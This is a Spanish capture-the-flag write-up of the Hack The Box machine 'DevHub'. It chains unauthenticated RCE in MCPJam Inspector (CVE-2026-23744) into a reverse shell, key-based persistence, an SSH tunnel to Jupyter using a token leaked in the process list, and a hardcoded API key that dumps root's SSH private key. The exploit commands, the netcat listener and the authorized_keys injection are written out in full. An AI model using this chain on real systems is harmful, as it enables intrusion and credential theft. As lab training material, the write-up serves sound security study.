DevHub es una máquina Linux que expone en internet una instancia de MCPJam Inspector, una herramienta de desarrollo para MCP vulnerable a un fallo de ejecución remota de código sin autenticación (CVE-2026-23744) que da un foothold como `mcp-dev`. Un servidor Jupyter escuchando en loopback, alcanzado a través de un túnel SSH y desbloqueado con un token filtrado en el listado de procesos, proporciona ejecución de código como `analyst` para la flag de usuario. El root cae por una API key hardcodeada legible en un segundo servicio interno con sabor a MCP, cuya función de "recuperación de emergencia" entrega la clave privada SSH de root bajo petición.

`Not shown: 65532 filtered tcp ports (no-response)` es una firma distinta a la de un escaneo típico: los puertos simplemente sin uso suelen devolver closed (RST), pero "filtered" sin respuesta significa que algo está descartando las sondas en silencio — un firewall a nivel de host que permite solo una lista corta de puertos, en lugar del sistema operativo cerrando de forma natural lo que no escucha. La redirección que nmap no pudo seguir en el puerto 80 es la pista habitual de virtual hosting basado en nombre, así que `devhub.htb` se añadió a `/etc/hosts` — importó más adelante para el script de exploit y los logins SSH finales, aunque el propio puerto 80 resultó ser un callejón sin salida.

El puerto 6274 es el interesante. La detección de versión de nmap dispara una batería de sondas específicas de protocolo para identificar un servicio desconocido — peticiones de estado/versión DNS, una comprobación RPC, una petición de sesión TLS, un GET HTTP genérico, un HTTP OPTIONS, una petición RTSP. Todas y cada una volvieron como un HTTP 400 o como una respuesta HTTP completa, sin importar para qué protocolo estaban pensadas. Esa es la firma de un servidor HTTP normal sentado en un puerto no estándar: no entiende ninguna de esas tramas como otra cosa que no sea HTTP mal formado. La sonda `GetRequest` devolvió una página completa, y su `<title>MCPJam Inspector</title>` nombró la tecnología directamente.

### MCPJam Inspector — Puerto 6274

Navegando directamente al servicio se llega a su página de settings:

![MCPJam Inspector's Settings page, showing version v1.4.2 and configurable LLM provider API keys](/assets/img/HTB/DevHub/cap1.png)

**MCPJam Inspector v1.4.2**, confirmado directamente desde la interfaz. MCPJam Inspector es una herramienta de depuración y testing basada en Node.js para el **Model Context Protocol (MCP)** — una especificación que Anthropic introdujo a finales de 2024 para estandarizar cómo los agentes basados en LLM hablan con herramientas externas, fuentes de datos y otros agentes. Los servidores MCP implementan el protocolo; MCPJam Inspector es un cliente construido para conectarse a ellos y ejercitar sus capacidades durante el desarrollo.

La versión 1.4.2 cae justo dentro del rango señalado por un advisory público: **CVE-2026-23744**, con una PoC pública en [`github.com/alisster00/CVE-2026-23744-RCE`](https://github.com/alisster00/CVE-2026-23744-RCE).

## Explotación

### CVE-2026-23744 — RCE sin Autenticación en MCPJam Inspector

Los servidores MCP normalmente son procesos locales: un cliente como Inspector los lanza como subprocesos y habla con ellos por stdio. Para soportar ese flujo, el endpoint `/api/mcp/connect` de Inspector acepta un objeto JSON `serverConfig` que nombra un `command` y unos `args` para lanzar un nuevo servidor de prueba — una funcionalidad legítima para el desarrollo local. El fallo es que las versiones hasta la 1.4.2 exponían ese endpoint **sin ninguna autenticación** (CWE-306, falta de autenticación para una función crítica), y la aplicación se bindea a `0.0.0.0` en lugar de a `127.0.0.1` por defecto, así que de entrada es alcanzable desde la red. Juntando ambas cosas, la "funcionalidad" no necesita ninguna explotación más allá de usarla tal cual está diseñada: cualquiera que pueda alcanzar el puerto puede especificar el comando que quiera, e Inspector lo lanza como hijo de su propio proceso Node.js — ejecución de código arbitraria, sin autenticación, sin interacción del usuario.

```bash
python3 script.py devhub.htb -l 10.10.15.75 --lport 4444
[*] MCPJam accessible at http://devhub.htb:6274
[*] Target: http://devhub.htb:6274
[*] Callback: 10.10.15.75:4444
[*] Sending payload to /api/mcp/connect...
[+] Payload sent!
[+] Check your listener for reverse shell
```

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 38906
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

El listener recibió el callback como `mcp-dev` — un directorio de trabajo bajo `/opt/mcpjam/node_modules/@mcpjam/inspector` confirma que Inspector se instaló como dependencia de npm y corre bajo su propia cuenta de servicio dedicada, no como un usuario compartido o privilegiado. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

### Alcanzando Jupyter a Través de un Túnel SSH

Un curl a `127.0.0.1:8888` confirmó que una app web respondía, pero usarla de verdad — y su flujo de autenticación — implicaba alcanzarla desde un navegador real. Eso significaba reenviar el puerto de loopback hacia fuera por SSH. En lugar de pelearse con un par de claves recién generado, el camino más simple fue meter directamente la clave pública ya existente del atacante en el `authorized_keys` de `mcp-dev`:

```bash
ssh-keygen
Generating public/private rsa key pair.
[...]
```

```bash
# meto mi clave pública al authorized_keys
mcp-dev@devhub:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH90S0Re+wfpOzgkSgo452ECnqrGMhIiUwvGt9ElCKBI ander@monre" > authorized_keys
```

```bash
ssh -i .ssh/id_ed25519 -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb -N
```

`-L 8888:127.0.0.1:8888` reenvía el puerto local 8888 del atacante a `127.0.0.1:8888` visto desde el objetivo; `-N` evita abrir una shell, ya que lo único necesario es el túnel. Navegar a `localhost:8888` en local ahora alcanza Jupyter como si se estuviera sentado en la propia máquina:

![Jupyter's login page reached through the SSH tunnel, showing the token-authentication notice](/assets/img/HTB/DevHub/cap2.png)

La página de login de Jupyter ofrece dos caminos: pegar el token directamente cada vez, o gastarlo una vez para fijar una contraseña permanente. El valor filtrado de `ps -auxfww` fue al formulario **Setup a Password** junto con una nueva contraseña elegida por el atacante:

![Entering the leaked Jupyter token and a new password in the Setup a Password form](/assets/img/HTB/DevHub/cap3.png)

Eso cambia un token de un solo uso por credenciales duraderas y elegidas por uno mismo — sin necesidad de conservar el token ni releer el listado de procesos en cada visita.

### Leyendo el Código Fuente

El script está detrás del servicio en `127.0.0.1:5000` visto antes en `netstat`. Una primera sonda confirmó que protege su endpoint:

```bash
curl -X POST http://127.0.0.1:5000/tools/call
{"error":"Unauthorized","message":"Valid X-API-Key header required"}
```

El código fuente explicaba exactamente cuál tenía que ser esa key — hardcodeada a la vista:

```
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Con la key pero sin cuerpo, la aplicación llegó lo bastante lejos como para quejarse de la forma de la petición en lugar de la autenticación:

```bash
curl -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a'
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

El resto del código describía el cuerpo esperado: un `name` nombrando una de las "tools" registradas del servidor, más un objeto `arguments` para ella. Una de esas tools, `ops._admin_dump`, estaba construida para recuperación de credenciales de emergencia — su código devolvía material de clave SSH para un `target` dado, protegido solo por un flag `confirm: true`. Nada en el endpoint distinguía a un operador legítimo ejecutando una recuperación real de cualquiera que simplemente hubiera leído el mismo fichero de código del que salió la API key.

### Disparando el Volcado

```bash
curl -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n[...]\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

La respuesta es la clave privada SSH de root, escapada como JSON con secuencias literales `\n` en lugar de saltos de línea reales. Devolverlos a su forma real recupera un PEM utilizable:

```bash
cat raw_id_rsa | sed 's/\\n/\n/g' > id_rsa
chmod 700 id_rsa
ssh -i id_rsa root@devhub.htb
[...]
root@devhub:~# cat root.txt
```

`ops._admin_dump` hizo exactamente lo que su nombre prometía — volcar secretos de administración bajo petición — sin ninguna comprobación de quién lo estaba pidiendo.

## Conclusiones Clave

- **Una herramienta construida para lanzar procesos locales arbitrarios bajo petición es tan segura como la puerta que tenga delante.** CVE-2026-23744 no fue un bug de corrupción de memoria ni un bypass ingenioso — el endpoint `/api/mcp/connect` de MCPJam Inspector hizo exactamente lo que estaba diseñado para hacer, para quien fuera que lo pidiera. Bindear a `0.0.0.0` por defecto convirtió una funcionalidad local ya de por sí peligrosa en una alcanzable por red.
- **Los argumentos de línea de comandos no son un almacén de secretos.** Pasar un token o una contraseña al invocar un proceso lo deja en la salida de `ps aux` de cualquier usuario local mientras el proceso siga vivo; el token de Jupyter aquí era visible para cualquier proceso, sin ningún privilegio especial.
- **Un token filtrado de un solo uso suele ser canjeable por algo duradero.** Si se le da la oportunidad, un atacante cambiará un token por una contraseña, una cookie o una clave — una credencial que sobrevive a la rotación o a los límites de reutilización, convirtiendo una fuga puntual en acceso permanente.
- **Los secretos hardcodeados en código legible por el grupo o por todos son secretos solo de nombre.** Una API key en texto plano en un fichero que `analyst` podía leer le dio a `analyst` todo lo necesario para autenticarse como si fuera el operador legítimo del servicio.
- **Las funciones de "recuperación de emergencia" o "admin" son objetivos prioritarios de escalada de privilegios.** Cualquier ruta de código cuyo trabajo explícito sea entregar secretos de alto valor merece una autenticación más fuerte que el resto de la API, no la misma key compartida que cualquier otro endpoint.
- **Una cuenta de servicio dedicada solo limita el radio de impacto si nada más adelante confía en ella más de la cuenta.** Correr MCPJam bajo su propio usuario `mcp-dev` contuvo el RCE inicial a esa cuenta, pero la cadena siguió de todas formas: `mcp-dev` todavía podía alcanzar un servicio de `analyst` insuficientemente protegido, y `analyst` podía leer los secretos de un servicio propiedad de root.
